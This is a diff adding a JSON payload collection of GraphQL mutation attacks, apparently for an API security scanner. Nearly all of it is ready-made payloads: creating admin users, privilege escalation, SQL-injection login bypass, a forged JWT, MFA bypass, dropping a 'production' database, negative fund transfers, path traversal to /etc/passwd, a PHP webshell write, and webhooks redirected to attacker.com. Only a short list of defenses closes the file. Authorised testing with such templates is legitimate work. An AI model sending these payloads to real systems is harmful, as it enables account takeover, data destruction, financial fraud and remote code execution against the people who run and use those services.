@@ -1,0 +1,329 @@
+{
+  "info": {
+    "name": "GraphQL Dangerous Mutations",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "High-risk GraphQL mutation templates for authorization bypass, data destruction, and privilege escalation testing. 2026 updated.",
+    "category": "API",
+    "severity": "CRITICAL",
+    "owasp": "A01:2021 - Broken Access Control"
+  },
+  "mutation_templates": {
+    "user_manipulation": [
+      {
+        "mutation": "mutation CreateUser($input: CreateUserInput!) { createUser(input: $input) { id success } }",
+        "variables": {"input": {"username": "hacker", "email": "hacker@evil.com", "password": "P@ssw0rd123!", "role": "admin"}},
+        "description": "Create admin user",
+        "risk": "CRITICAL",
+        "cwe": "CWE-639"
+      },
+      {
+        "mutation": "mutation UpdateUser($id: ID!, $input: UpdateUserInput!) { updateUser(id: $id, input: $input) { id success } }",
+        "variables": {"id": "1", "input": {"role": "admin", "isActive": true}},
+        "description": "Privilege escalation via update",
+        "risk": "CRITICAL",
+        "cwe": "CWE-269"
+      },
+      {
+        "mutation": "mutation DeleteUser($id: ID!) { deleteUser(id: $id) { success } }",
+        "variables": {"id": "1"},
+        "description": "Delete admin user",
+        "risk": "CRITICAL",
+        "cwe": "CWE-639"
+      },
+      {
+        "mutation": "mutation ForcePasswordReset($userId: ID!) { forcePasswordReset(userId: $userId) { success } }",
+        "variables": {"userId": "1"},
+        "description": "Force admin password reset",
+        "risk": "CRITICAL",
+        "cwe": "CWE-639"
+      },
+      {
+        "mutation": "mutation ChangeEmail($userId: ID!, $newEmail: String!) { changeEmail(userId: $userId, newEmail: $newEmail) { success } }",
+        "variables": {"userId": "1", "newEmail": "attacker@evil.com"},
+        "description": "Account takeover via email change",
+        "risk": "CRITICAL",
+        "cwe": "CWE-639"
+      }
+    ],
+    "authentication_bypass": [
+      {
+        "mutation": "mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) { token user { id role } } }",
+        "variables": {"username": "admin", "password": "admin' OR '1'='1"},
+        "description": "SQL-like injection in login",
+        "risk": "HIGH",
+        "cwe": "CWE-287"
+      },
+      {
+        "mutation": "mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) { token user { id role } } }",
+        "variables": {"username": "admin", "password": "' OR 1=1--"},
+        "description": "SQL injection bypass",
+        "risk": "HIGH",
+        "cwe": "CWE-287"
+      },
+      {
+        "mutation": "mutation LoginWithToken($token: String!) { loginWithToken(token: $token) { token user { id } } }",
+        "variables": {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake"},
+        "description": "JWT token manipulation",
+        "risk": "HIGH",
+        "cwe": "CWE-287"
+      },
+      {
+        "mutation": "mutation Skip MFA($code: String!) { skipMFA(code: $code) { success } }",
+        "variables": {"code": "000000"},
+        "description": "MFA bypass attempt",
+        "risk": "HIGH",
+        "cwe": "CWE-287"
+      },
+      {
+        "mutation": "mutation DisableMFA($userId: ID!) { disableMFA(userId: $userId) { success } }",
+        "variables": {"userId": "1"},
+        "description": "Disable MFA for admin",
+        "risk": "CRITICAL",
+        "cwe": "CWE-287"
+      }
+    ],
+    "session_manipulation": [
+      {
+        "mutation": "mutation CreateSession($userId: ID!) { createSession(userId: $userId) { token } }",
+        "variables": {"userId": "1"},
+        "description": "Create session as any user",
+        "risk": "CRITICAL",
+        "cwe": "CWE-639"
+      },
+      {
+        "mutation": "mutation InvalidateAllSessions($userId: ID!) { invalidateAllSessions(userId: $userId) { success } }",
+        "variables": {"userId": "1"},
+        "description": "Denial of service via session invalidation",
+        "risk": "MEDIUM",
+        "cwe": "CWE-400"
+      },
+      {
+        "mutation": "mutation ExtendSession($sessionId: ID!) { extendSession(sessionId: $sessionId) { expiresAt } }",
+        "variables": {"sessionId": "fake-session-id"},
+        "description": "Session extension",
+        "risk": "MEDIUM",
+        "cwe": "CWE-613"
+      }
+    ],
+    "role_permission_escalation": [
+      {
+        "mutation": "mutation GrantRole($userId: ID!, $role: String!) { grantRole(userId: $userId, role: $role) { success } }",
+        "variables": {"userId": "2", "role": "superadmin"},
+        "description": "Grant superadmin role",
+        "risk": "CRITICAL",
+        "cwe": "CWE-269"
+      },
+      {
+        "mutation": "mutation AddPermission($userId: ID!, $permission: String!) { addPermission(userId: $userId, permission: $permission) { success } }",
+        "variables": {"userId": "2", "permission": "*"},
+        "description": "Add wildcard permission",
+        "risk": "CRITICAL",
+        "cwe": "CWE-269"
+      },
+      {
+        "mutation": "mutation UpdateRole($roleId: ID!, $permissions: [String!]!) { updateRole(roleId: $roleId, permissions: $permissions) { success } }",
+        "variables": {"roleId": "1", "permissions": ["read:*", "write:*", "delete:*", "admin:*"]},
+        "description": "Grant all permissions to role",
+        "risk": "CRITICAL",
+        "cwe": "CWE-269"
+      },
+      {
+        "mutation": "mutation CreateRole($name: String!, $permissions: [String!]!) { createRole(name: $name, permissions: $permissions) { id } }",
+        "variables": {"name": "godmode", "permissions": ["*"]},
+        "description": "Create godmode role",
+        "risk": "CRITICAL",
+        "cwe": "CWE-269"
+      }
+    ],
+    "data_destruction": [
+      {
+        "mutation": "mutation DeleteAllUsers { deleteAllUsers { count success } }",
+        "variables": {},
+        "description": "Delete all users",
+        "risk": "CRITICAL",
+        "cwe": "CWE-400"
+      },
+      {
+        "mutation": "mutation TruncateTable($tableName: String!) { truncateTable(tableName: $tableName) { success } }",
+        "variables": {"tableName": "users"},
+        "description": "Truncate users table",
+        "risk": "CRITICAL",
+        "cwe": "CWE-400"
+      },
+      {
+        "mutation": "mutation DropDatabase($name: String!) { dropDatabase(name: $name) { success } }",
+        "variables": {"name": "production"},
+        "description": "Drop production database",
+        "risk": "CRITICAL",
+        "cwe": "CWE-400"
+      },
+      {
+        "mutation": "mutation DeleteAll($type: String!) { deleteAll(type: $type) { count success } }",
+        "variables": {"type": "posts"},
+        "description": "Delete all of type",
+        "risk": "CRITICAL",
+        "cwe": "CWE-400"
+      },
+      {
+        "mutation": "mutation WipeAccount($accountId: ID!) { wipeAccount(accountId: $accountId) { success } }",
+        "variables": {"accountId": "1"},
+        "description": "Wipe entire account",
+        "risk": "CRITICAL",
+        "cwe": "CWE-400"
+      }
+    ],
+    "financial_tampering": [
+      {
+        "mutation": "mutation UpdateBalance($accountId: ID!, $amount: Float!) { updateBalance(accountId: $accountId, amount: $amount) { newBalance } }",
+        "variables": {"accountId": "1", "amount": 1000000},
+        "description": "Set arbitrary balance",
+        "risk": "CRITICAL",
+        "cwe": "CWE-20"
+      },
+      {
+        "mutation": "mutation TransferFunds($from: ID!, $to: ID!, $amount: Float!) { transferFunds(from: $from, to: $to, amount: $amount) { success } }",
+        "variables": {"from": "1", "to": "999", "amount": -999999},
+        "description": "Negative transfer (credit)",
+        "risk": "CRITICAL",
+        "cwe": "CWE-20"
+      },
+      {
+        "mutation": "mutation SetPrice($productId: ID!, $price: Float!) { setPrice(productId: $productId, price: $price) { success } }",
+        "variables": {"productId": "1", "price": 0.01},
+        "description": "Set product to $0.01",
+        "risk": "HIGH",
+        "cwe": "CWE-20"
+      },
+      {
+        "mutation": "mutation ApplyDiscount($code: String!, $percent: Int!) { applyDiscount(code: $code, percent: $percent) { success } }",
+        "variables": {"code": "SAVE99", "percent": 99},
+        "description": "99% discount",
+        "risk": "HIGH",
+        "cwe": "CWE-20"
+      },
+      {
+        "mutation": "mutation IssueRefund($transactionId: ID!, $amount: Float!) { issueRefund(transactionId: $transactionId, amount: $amount) { success } }",
+        "variables": {"transactionId": "1", "amount": 99999},
+        "description": "Over-refund",
+        "risk": "CRITICAL",
+        "cwe": "CWE-20"
+      }
+    ],
+    "file_operations": [
+      {
+        "mutation": "mutation UploadFile($filename: String!, $content: String!) { uploadFile(filename: $filename, content: $content) { url success } }",
+        "variables": {"filename": "../../../etc/passwd", "content": ""},
+        "description": "Path traversal file upload",
+        "risk": "CRITICAL",
+        "cwe": "CWE-22"
+      },
+      {
+        "mutation": "mutation WriteFile($path: String!, $content: String!) { writeFile(path: $path, content: $content) { success } }",
+        "variables": {"path": "/var/www/html/shell.php", "content": "<?php system($_GET['c']); ?>"},
+        "description": "Webshell write",
+        "risk": "CRITICAL",
+        "cwe": "CWE-94"
+      },
+      {
+        "mutation": "mutation DeleteFile($path: String!) { deleteFile(path: $path) { success } }",
+        "variables": {"path": "/etc/passwd"},
+        "description": "Critical file deletion",
+        "risk": "CRITICAL",
+        "cwe": "CWE-22"
+      }
+    ],
+    "api_key_management": [
+      {
+        "mutation": "mutation CreateAPIKey($name: String!, $permissions: [String!]!) { createAPIKey(name: $name, permissions: $permissions) { key } }",
+        "variables": {"name": "attacker-key", "permissions": ["*"]},
+        "description": "Create unrestricted API key",
+        "risk": "CRITICAL",
+        "cwe": "CWE-269"
+      },
+      {
+        "mutation": "mutation RotateAPIKey($keyId: ID!) { rotateAPIKey(keyId: $keyId) { newKey } }",
+        "variables": {"keyId": "1"},
+        "description": "Rotate admin API key",
+        "risk": "HIGH",
+        "cwe": "CWE-613"
+      },
+      {
+        "mutation": "mutation DeleteAPIKey($keyId: ID!) { deleteAPIKey(keyId: $keyId) { success } }",
+        "variables": {"keyId": "1"},
+        "description": "Delete admin API key (DoS)",
+        "risk": "HIGH",
+        "cwe": "CWE-400"
+      }
+    ],
+    "webhook_configuration": [
+      {
+        "mutation": "mutation CreateWebhook($url: String!, $events: [String!]!) { createWebhook(url: $url, events: $events) { id } }",
+        "variables": {"url": "https://attacker.com/callback", "events": ["*"]},
+        "description": "Create webhook to attacker",
+        "risk": "HIGH",
+        "cwe": "CWE-918"
+      },
+      {
+        "mutation": "mutation UpdateWebhook($id: ID!, $url: String!) { updateWebhook(id: $id, url: $url) { success } }",
+        "variables": {"id": "1", "url": "https://attacker.com/steal"},
+        "description": "Modify webhook to attacker",
+        "risk": "HIGH",
+        "cwe": "CWE-918"
+      }
+    ],
+    "environment_configuration": [
+      {
+        "mutation": "mutation SetEnv($key: String!, $value: String!) { setEnv(key: $key, value: $value) { success } }",
+        "variables": {"key": "DEBUG", "value": "true"},
+        "description": "Enable debug mode",
+        "risk": "HIGH",
+        "cwe": "CWE-16"
+      },
+      {
+        "mutation": "mutation SetConfig($key: String!, $value: String!) { setConfig(key: $key, value: $value) { success } }",
+        "variables": {"key": "ALLOW_ADMIN_API", "value": "true"},
+        "description": "Enable admin API",
+        "risk": "CRITICAL",
+        "cwe": "CWE-16"
+      },
+      {
+        "mutation": "mutation UpdateSettings($settings: JSON!) { updateSettings(settings: $settings) { success } }",
+        "variables": {"settings": {"rateLimit": 0, "authRequired": false}},
+        "description": "Disable security controls",
+        "risk": "CRITICAL",
+        "cwe": "CWE-16"
+      }
+    ]
+  },
+  "mutation_introspection": {
+    "find_mutations": "{ __schema { mutationType { name fields { name args { name type { name kind ofType { name } } } } } } }",
+    "find_all_types": "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }",
+    "find_sensitive_fields": "{ __schema { types { name fields { name args { name type { name } } } } } }"
+  },
+  "common_sensitive_mutations": [
+    "createAdmin", "deleteUser", "updateRole", "grantPermission", 
+    "resetPassword", "changeEmail", "disableMFA", "enableMFA",
+    "createAPIKey", "deleteAPIKey", "transferFunds", "setPrice",
+    "uploadFile", "writeFile", "executeCode", "runQuery",
+    "deleteAll", "truncate", "dropDatabase", "createWebhook"
+  ],
+  "testing_methodology": [
+    "1. Run introspection to discover all mutations",
+    "2. Map mutations to business logic",
+    "3. Test each mutation without authentication",
+    "4. Test with low-privilege authentication",
+    "5. Test with cross-user ID manipulation",
+    "6. Test with injection in input fields",
+    "7. Test authorization bypass via aliases"
+  ],
+  "defense_recommendations": [
+    "Implement per-field authorization",
+    "Use input validation and sanitization",
+    "Rate limit mutation endpoints",
+    "Log all mutation executions",
+    "Implement query complexity limits",
+    "Disable introspection in production",
+    "Use persisted queries where possible"
+  ]
+}
